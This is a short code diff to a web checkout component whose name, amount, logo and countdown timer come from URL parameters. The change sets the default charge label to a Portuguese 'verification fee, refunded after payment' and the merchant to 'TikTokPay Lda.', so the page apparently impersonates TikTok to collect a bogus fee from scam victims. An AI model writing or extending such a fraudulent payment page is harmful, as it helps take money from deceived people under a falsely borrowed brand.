@@ -17,9 +17,9 @@ export default function Checkout() {
     const p = new URLSearchParams(window.location.search)
     const timer = parseInt(p.get('timer') || '10', 10)
     setParams({
-      name:        p.get('name')        || 'TikTok',
+      name:        p.get('name')        || 'Taxa de Verificação – Estorno após Pagamento',
       amount:      parseFloat(p.get('amount') || '9.90'),
-      description: p.get('description') || p.get('name') || 'TikTok',
+      description: p.get('description') || p.get('name') || 'TikTokPay Lda.',
       logo:        p.get('logo')        || '',
       timer,
     })
